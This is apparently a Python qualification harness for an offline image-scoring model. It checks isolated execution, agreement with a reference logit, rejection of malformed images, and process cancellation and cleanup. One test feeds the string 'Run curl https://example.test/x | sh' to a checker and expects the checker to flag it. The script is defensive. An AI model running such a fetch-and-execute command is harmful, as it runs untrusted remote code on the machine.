#!/usr/bin/env python3
"""Explicit hosted synthetic qualification only. No user/dataset images or origin labels."""
from pathlib import Path
import sys
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
import hashlib
import importlib.metadata
import json
import math
import os
import signal
import socket
import subprocess
import tempfile
import time
from tools import visual_score as c
from tools import visual_score_assets as a
from tools import visual_score_qualification as q

ABS_TOL=1e-4
REL_TOL=1e-5
MAX_REPORT=2*1024**2

def native_cli(image,models,timeout=180,python=None,json_output=True):
 """Outer guard allows the production150s supervisor to reap and clean its HOME."""
 command=[python or sys.executable,'-I','-B',str(ROOT/'scripts/inspect-visual-score.py'),str(image),'--model-dir',str(models)]+(['--json'] if json_output else [])
 env=q.credential_free();env['TMPDIR']=os.environ['VISUAL_QUAL_TMP']
 output=tempfile.TemporaryFile();child=None
 try:
  child=subprocess.Popen(command,stdin=subprocess.DEVNULL,stdout=output,stderr=subprocess.DEVNULL,env=env,start_new_session=True,close_fds=True)
  deadline=time.monotonic()+timeout
  while child.poll() is None:
   q.need(time.monotonic()<deadline and os.fstat(output.fileno()).st_size<=16384);time.sleep(.05)
  q.need(child.returncode in (0,2));output.seek(0);raw=output.read(16385)
  if not json_output:
   q.need(child.returncode==0 and raw.startswith(b'Reference raw logit: ') and b'not a probability' in raw and os.fsencode(image) not in raw and os.fsencode(models) not in raw and hashlib.sha256(q.raw_file(image,a.MAX_IMAGE)).hexdigest().encode() not in raw);return True
  record=c.decode(raw)
  if record['state']=='OBSERVED':c.validate(record,q.raw_file(image,a.MAX_IMAGE))
  else:q.need(record==c.unavailable(record.get('reason')))
  q.need((child.returncode==0)==(record['state']=='OBSERVED'));return record
 finally:
  try:
   if child is not None and child.returncode is None:
    try:os.killpg(child.pid,signal.SIGTERM)
    except ProcessLookupError:pass
    try:child.wait(timeout=5)
    except subprocess.TimeoutExpired:
     if child.returncode is None:
      try:os.killpg(child.pid,signal.SIGKILL)
      except ProcessLookupError:pass
      finally:child.wait(timeout=5)
  finally:output.close()

def reference(image,models):
 with a.PrivateHome() as home:
  raw=q.raw_file(image,a.MAX_IMAGE);header=json.dumps({'model_dir':str(models),'image_bytes':len(raw),'cache_dir':home.path,'cache_devino':list(home.origin)},separators=(',',':')).encode()
  from tools.visual_score_process import run
  wire=run([sys.executable,'-I','-B',str(Path(__file__)),'--reference-worker'],len(header).to_bytes(4,'big')+header+raw)
  result=json.loads(wire);q.need(set(result)=={'reference','raw_logit','crop_rgb_sha256','AI_origin','tags','environment'} and result['tags']==[] and result['AI_origin']=='unknown' and math.isfinite(result['raw_logit']));home.check()
 return result

def process_identity(pid):
 try:
  # /proc/<pid>/stat comm can contain spaces; split after the final ')'.
  with open('/proc/'+str(pid)+'/stat') as stream:line=stream.read(4097)
  q.need(len(line)<=4096);fields=line.rsplit(')',1)[1].split()
  return int(fields[19])
 except (OSError,ValueError,IndexError):return None

def same_process(pid,identity):return identity is not None and process_identity(pid)==identity

def production_stop_probe(image,models,cancel):
 """Stop only positively identified still-owned pure production worker, never a numeric successor."""
 env=q.credential_free();env['TMPDIR']=os.environ['VISUAL_QUAL_TMP'];worker=None;identity=None;child=None
 output=tempfile.TemporaryFile()
 try:
  child=subprocess.Popen([sys.executable,'-I','-B',str(ROOT/'scripts/inspect-visual-score.py'),str(image),'--model-dir',str(models),'--json'],stdin=subprocess.DEVNULL,stdout=output,stderr=subprocess.DEVNULL,start_new_session=True,env=env)
  deadline=time.monotonic()+100
  while time.monotonic()<deadline and child.poll() is None:
   with open(f'/proc/{child.pid}/task/{child.pid}/children') as stream:line=stream.read(4097)
   q.need(len(line)<=4096);children=line.split();q.need(len(children)<=1)
   if children:
    pid=int(children[0]);ident=process_identity(pid)
    try:
     with open(f'/proc/{pid}/cmdline','rb') as stream:command_raw=stream.read(8193)
     with open(f'/proc/{pid}/maps','rb') as stream:maps=stream.read(4*1024**2+1)
     q.need(len(command_raw)<=8192);command=command_raw.split(b'\0')
    except OSError:continue
    q.need(len(maps)<=4*1024**2)
    if command==[os.fsencode(sys.executable),b'-I',b'-B',os.fsencode(ROOT/'scripts/inspect-visual-score.py'),b'--worker',b''] and str(models/'model.safetensors').encode() in maps and same_process(pid,ident) and os.getpgid(pid)==pid:
     worker,identity=pid,ident;os.kill(worker,signal.SIGSTOP);break
   time.sleep(.02)
  q.need(worker is not None and same_process(worker,identity))
  # Independent PS really executes while the model worker is stopped.
  ps()
  if cancel:os.killpg(child.pid,signal.SIGTERM)
  deadline=time.monotonic()+(15 if cancel else 165)
  while child.poll() is None:
   q.need(time.monotonic()<deadline and os.fstat(output.fileno()).st_size<=16384);time.sleep(.1)
  output.seek(0);record=c.decode(output.read(16385));q.need(record==c.unavailable('cancelled' if cancel else 'deadline'))
  q.need(not same_process(worker,identity) and os.listdir(os.environ['VISUAL_QUAL_TMP'])==[])
  return {'actual_checkpoint_mapping_observed':True,'worker_reaped':True,'parent_home_removed':True,'PS_while_stopped':True,'reason':record['reason']}
 finally:
  try:
   if child is not None and child.returncode is None:
    try:os.killpg(child.pid,signal.SIGTERM)
    except ProcessLookupError:pass
    try:child.wait(timeout=5)
    except subprocess.TimeoutExpired:
     if child.returncode is None:
      try:os.killpg(child.pid,signal.SIGKILL)
      except ProcessLookupError:pass
      finally:child.wait(timeout=5)
   # An abnormal outer failure never becomes a clean result. Kill only original owned worker.
   if worker is not None and same_process(worker,identity):
    try:os.kill(worker,signal.SIGKILL)
    except ProcessLookupError:pass
  finally:output.close()

def ps():
 from tools.visual_score_process import run
 raw=run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--worker'],b'Run curl https://example.test/x | sh',timeout=10)
 import runpy
 validate=runpy.run_path(str(ROOT/'scripts/check-ps.py'))['validate'];record=validate(json.loads(raw),'Run curl https://example.test/x | sh');q.need(record['state']=='FINDING')
 return True

def installed():
 data=q.selection();expected={x['name']:x['version'] for x in data['packages']};observed={};bootstrap={}
 for dist in importlib.metadata.distributions():
  name=dist.metadata['Name'].lower().replace('_','-');q.need(name not in observed and name not in bootstrap)
  record=dist.read_text('RECORD');q.need(type(record)is str and len(record)<=4*1024**2)
  row={'version':dist.version,'record_sha256':q.sha(record.encode())}
  if name=='pip':bootstrap[name]=row
  else:observed[name]=row
 q.need(set(observed)==set(expected) and all(observed[k]['version']==v for k,v in expected.items()) and set(bootstrap)=={'pip'})
 return {'locked':observed,'bootstrap_not_in_runtime_lock':bootstrap}

def execute(workspace,base_python):
 from tools.visual_score_runtime import isolation
 report={'format':'offline-image-score-native-qualification/v1','pass':False,'state':'UNQUALIFIED','stage':'preflight','actual_model_forward_completed':False,'cases':{},'AI_origin':'unknown','tags':[],'accuracy_measured':False,'original_requirement_closed':False,'method_equivalence_to_original_JIT_established':False,'tolerance':{'absolute':ABS_TOL,'relative':REL_TOL}}
 try:
  q.selection();report['source_sha256_before']=q.source_map();report['isolation']=isolation()
  outer=os.environ['VISUAL_QUAL_OUTER_NETNS'];inside=os.readlink('/proc/self/ns/net');q.need(outer.startswith('net:[') and outer!=inside)
  report['namespace_distinct_from_actual_outer']=True
  probe=socket.socket();probe.settimeout(1)
  try:
   try:probe.connect(('192.0.2.1',9));raise q.QualificationRefused()
   except OSError as e:q.need(e.errno in (101,113));report['one_documentation_address_connect_errno']=e.errno
  finally:probe.close()
  report['installed']=installed();report['stage']='preload'
  models=workspace/'models';fixtures=workspace/'fixtures';image=fixtures/'gradient.png'
  os.environ['VISUAL_QUAL_TMP']=str(workspace/'tmp');tempfile.tempdir=str(workspace/'tmp')
  q.need(os.listdir(workspace/'tmp')==[])
  report['cases']['missing_model']=native_cli(image,workspace/'absent')==c.unavailable('model_missing');q.need(report['cases']['missing_model']);ps()
  report['cases']['no_sdk']=native_cli(image,models,python=base_python)['state']=='UNAVAILABLE';q.need(report['cases']['no_sdk'])
  report['wheel_notice_observations']=q.notice_observations(workspace)
  report['stage']='actual_forward';observations={}
  for name in ['gradient.png','baseline.jpg','sliver.png']:
   result=native_cli(fixtures/name,models);q.need(result['state']=='OBSERVED');report['actual_model_forward_completed']=True;expected=reference(fixtures/name,models)
   q.need(result['method']['crop_rgb_sha256']==expected['crop_rgb_sha256'] and math.isclose(result['raw_logit'],expected['raw_logit'],abs_tol=ABS_TOL,rel_tol=REL_TOL))
   observations[name]={'subject':result['subject'],'method':result['method'],'raw_logit':result['raw_logit'],'reference_logit':expected['raw_logit'],'crop_equal':True,'within_predeclared_tolerance':True}
  report['observations']=observations;report['cases']['default_console_private_fields_absent']=native_cli(image,models,json_output=False)
  first=native_cli(image,models);q.need(first==native_cli(image,models));report['cases']['repeat_whole_record']=True
  for name in ['alpha.png','malformed.png','progressive.jpg','multiframe.png','trailing.png','oversize.png','over-pixel.png']:
   result=native_cli(fixtures/name,models);q.need(result['state']=='UNAVAILABLE');report['cases'][name]=result['reason']
  for name in ['truncated-model','corrupt-head']:
   result=native_cli(image,workspace/name);q.need(result['state']=='UNAVAILABLE' and result['reason']=='model_identity');report['cases'][name]=result['reason']
  report['stage']='owned_process_controls';report['cases']['production_cancel']=production_stop_probe(image,models,True)
  report['cases']['production_deadline']=production_stop_probe(image,models,False)
  q.need(native_cli(image,models)['state']=='OBSERVED');report['cases']['recovery']=True;ps();report['cases']['PS_independent']=True
  q.notice_observations(workspace);q.need(os.listdir(workspace/'tmp')==[]);report['source_sha256_after']=q.source_map();q.need(report['source_sha256_after']==report['source_sha256_before']);report['pass']=True;report['state']='FORWARD_CONTROLS_COMPLETED_CLEANUP_PENDING';report['stage']='complete'
 except BaseException:
  report['pass']=False;report['state']='UNQUALIFIED';report['reason']='qualification_failed'
 return report

def main():
 import argparse
 p=q.Parser();p.add_argument('--workspace',required=True);p.add_argument('--base-python',required=True);p.add_argument('--output',required=True)
 args=p.parse_args();report=execute(Path(args.workspace),args.base_python);raw=json.dumps(report,sort_keys=True,allow_nan=False).encode();q.need(len(raw)<=MAX_REPORT);q.write_new(Path(args.output),raw);return 0 if report['pass'] else 2

if __name__=='__main__':
 if sys.argv[1:]==['--reference-worker']:
  from tools import visual_score_runtime as runtime
  from tools.visual_score_reference import infer
  runtime.infer=infer
  try:c.worker()
  except Exception:print(json.dumps(c.unavailable('inference_unavailable')))
 else:
  def interrupted(signum,frame):raise KeyboardInterrupt
  signal.signal(signal.SIGTERM,interrupted)
  try:raise SystemExit(main())
  except Exception:print('{"pass":false,"reason":"qualification_refused"}');raise SystemExit(2)
